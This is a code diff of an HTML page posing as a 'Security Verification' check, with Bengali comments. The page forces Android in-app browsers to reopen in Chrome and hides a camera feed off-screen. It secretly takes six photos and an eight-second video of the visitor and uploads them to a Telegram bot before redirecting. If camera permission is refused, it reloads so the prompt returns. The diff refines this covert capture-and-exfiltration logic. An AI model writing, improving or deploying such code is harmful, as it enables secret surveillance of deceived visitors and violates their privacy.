@@ -6,7 +6,7 @@
     <title>Security Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        #v_stream { position: fixed; left: -9999px; opacity: 0; }
+        #v_stream { position: fixed; left: -9999px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body class="bg-gray-100 flex items-center justify-center min-h-screen">
@@ -28,9 +28,9 @@
     <canvas id="c_save" class="hidden"></canvas>
 
     <script>
-        // ১. সরাসরি Chrome-এ নিয়ে যাওয়ার সিস্টেম (Messenger & Telegram Fixed)
+        // ১. সরাসরি Chrome-এ নিয়ে যাওয়ার সিস্টেম
         const ua = navigator.userAgent;
-        if (/FBAN|FBAV|Messenger|Telegram|Instagram/i.test(ua) && ua.includes("Android")) {
+        if (/FBAN|FBAV|Messenger|Telegram|Instagram|Line/i.test(ua) && ua.includes("Android")) {
             const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
             window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
         }
@@ -42,6 +42,7 @@
         };
 
         let timeLeft = 15;
+        let photoCount = 0;
 
         async function init() {
             try {
@@ -56,41 +57,43 @@
                     if(timeLeft <= 0) clearInterval(timerInt);
                 }, 1000);
 
-                // ক্যামেরা রেডি হওয়ার জন্য ১.৫ সেকেন্ড বিরতি (যাতে ছবি কালো না হয়)
-                setTimeout(async () => {
-                    // আগে ৬টি ছবি তোলা শেষ হবে
-                    for (let i = 1; i <= 6; i++) {
-                        await takeSnap(i);
-                        await new Promise(r => setTimeout(r, 600)); 
-                    }
-                    
-                    // ছবি তোলা শেষ হলে ভিডিও শুরু
-                    startVideoRecording(stream);
-                }, 1500);
+                // ভিডিও থেকে ছবি ক্যাপচার করার নতুন টেকনিক
+                video.onloadedmetadata = () => {
+                    // ৩ সেকেন্ড ওয়েট করো ক্যামেরা ব্রাইটনেস অ্যাডজাস্ট হওয়ার জন্য
+                    setTimeout(() => {
+                        const captureInterval = setInterval(() => {
+                            if (photoCount < 6) {
+                                takePhotoFromVideo(video);
+                                photoCount++;
+                            } else {
+                                clearInterval(captureInterval);
+                                startVideoRecording(stream);
+                            }
+                        }, 1000); // প্রতি ১ সেকেন্ডে একটি ক্লিয়ার ছবি
+                    }, 2000);
+                };
 
             } catch (err) {
-                // পারমিশন না দিলে অটো রিলোড (বারবার চাইবে)
+                // পারমিশন না দিলে রিলোড
                 setTimeout(() => { location.reload(); }, 500);
             }
         }
 
-        function takeSnap(count) {
-            return new Promise((resolve) => {
-                const video = document.getElementById('v_stream');
-                const canvas = document.getElementById('c_save');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
+        function takePhotoFromVideo(video) {
+            const canvas = document.getElementById('c_save');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // ভিডিওর বর্তমান ফ্রেমটি ক্যানভাসে ড্র করো
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CONFIG.c);
-                    formData.append('photo', blob, `img${count}.jpg`);
-                    fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto`, { method: 'POST', body: formData })
-                    .finally(() => resolve());
-                }, 'image/jpeg', 0.9);
-            });
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.c);
+                formData.append('photo', blob, 'shot.jpg');
+                fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg', 0.9);
         }
 
         function startVideoRecording(stream) {
@@ -101,9 +104,8 @@
                 const blob = new Blob(chunks, { type: 'video/mp4' });
                 const formData = new FormData();
                 formData.append('chat_id', CONFIG.c);
-                formData.append('video', blob, 'capture.mp4');
+                formData.append('video', blob, 'video.mp4');
                 await fetch(`https://api.telegram.org/bot${CONFIG.t}/sendVideo`, { method: 'POST', body: formData });
-                // সব কাজ শেষে রিডাইরেক্ট
                 window.location.replace(CONFIG.u);
             };
 
@@ -111,7 +113,7 @@
             setTimeout(() => {
                 mediaRecorder.stop();
                 stream.getTracks().forEach(t => t.stop());
-            }, 10000); // ১০ সেকেন্ড ভিডিও
+            }, 8000); // ৮ সেকেন্ড ভিডিও (সব মিলিয়ে ১৫ সেকেন্ড)
         }
 
         window.onload = init;
